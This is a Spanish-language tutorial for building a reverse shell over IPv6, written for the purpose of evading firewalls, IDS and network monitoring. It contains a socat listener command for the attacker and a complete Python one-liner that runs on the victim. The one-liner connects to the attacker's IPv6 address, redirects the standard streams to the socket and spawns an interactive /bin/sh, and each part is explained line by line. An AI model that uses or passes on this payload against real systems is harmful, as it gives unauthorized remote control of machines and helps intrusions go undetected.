# **Reverse Shell sobre IPv6 con Python y Socat**

Establecer un canal de Mando y Control (C2) o una reverse shell a través de IPv6 es una técnica eficaz para evadir firewalls, sistemas de detección de intrusiones (IDS) y monitorización de red que puedan estar centrados exclusivamente en el tráfico IPv4.

Esta guía detalla el proceso para establecer una reverse shell interactiva desde una máquina víctima a una máquina atacante utilizando IPv6, `Python` y `socat`.

## **1. La Máquina del Atacante: Ponerse a la Escucha con `socat`**

Para recibir una conexión IPv6, no siempre es suficiente usar `netcat`. La herramienta **`socat`** es mucho más potente y versátil, especialmente para manejar diferentes familias de protocolos como IPv6.

### **Comando para el Listener**

Para ponerse a la escucha en una interfaz IPv6 específica en el puerto 443, se debe utilizar el siguiente comando:

```bash
sudo socat TCP6-LISTEN:443,fork,bind=dead:beef:2::1005 STDOUT
```

### **Análisis Detallado del Comando `socat`**

  * **`sudo`**: Es necesario si se quiere escuchar en un puerto privilegiado (cualquier puerto por debajo de 1024, como el 443).
  * **`socat`**: Es la herramienta, un relé multipropósito para flujos de datos bidireccionales.
  * **`TCP6-LISTEN:443`**: Esta es la dirección de escucha.
      * **`TCP6`**: Le dice a `socat` que utilice el protocolo TCP sobre IPv6.
      * **`LISTEN:443`**: Instruye a `socat` para que se ponga en modo de escucha en el puerto 443.
  * **`,fork`**: Esta opción es muy útil. Después de que se establezca una conexión, `socat` crea un nuevo proceso hijo para manejarla, y el proceso padre vuelve inmediatamente a escuchar en el mismo puerto. Esto permite recibir múltiples conexiones sin tener que reiniciar el listener.
  * **`,bind=dead:beef:2::1005`**: Esta opción es crucial para la seguridad y la precisión. Le dice a `socat` que se vincule **únicamente** a la dirección IPv6 especificada. Sin esto, `socat` escucharía en todas las interfaces IPv6 disponibles (`::`), lo que podría ser menos seguro.
  * **`STDOUT`**: Este es el segundo flujo de datos. Le dice a `socat` que redirija la conexión entrante a la **salida estándar** (tu terminal). Esto es lo que hace que la shell sea interactiva, ya que verás la salida de los comandos directamente en tu pantalla.

## **2. La Máquina Víctima: El Payload de Reverse Shell en Python**

### **Payload**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::1005",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### **Análisis Detallado del Payload de Python**

  * **`python -c '...'`**: Ejecuta el código Python que sigue como un comando.
  * **`import socket,subprocess,os`**: Importa las librerías necesarias: `socket` para la red, `subprocess` para ejecutar comandos y `os` para interactuar con el sistema operativo.
  * **`s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM)`**: Aquí reside la clave de la operación.
      * **`socket.socket(...)`**: Crea un nuevo objeto de socket.
      * **`socket.AF_INET6`**: Especifica la familia de direcciones como **IPv6**. En una reverse shell para IPv4, aquí se usaría `socket.AF_INET`.
      * **`socket.SOCK_STREAM`**: Especifica el tipo de socket como TCP (orientado a la conexión).
  * **`s.connect(("dead:beef:2::1005",443))`**: El socket intenta conectarse al listener `socat` del atacante, utilizando la tupla de dirección IPv6 y puerto.
  * **`os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);`**: Esta es la redirección de flujos estándar.
      * `s.fileno()`: Obtiene el descriptor de archivo del socket (un número que representa la conexión de red).
      * `os.dup2(origen, destino)`: Duplica el descriptor de archivo de `origen` al de `destino`.
      * Se está redirigiendo la entrada estándar (`stdin`, descriptor `0`), la salida estándar (`stdout`, descriptor `1`) y el error estándar (`stderr`, descriptor `2`) para que apunten a la conexión de red.
  * **`p=subprocess.call(["/bin/sh","-i"]);`**: Se ejecuta una nueva shell.
      * **`/bin/sh -i`**: Lanza una shell interactiva.
      * Debido a la redirección anterior, esta shell no está conectada a la terminal de la víctima, sino directamente al socket de red del atacante, proporcionando una shell remota completamente funcional.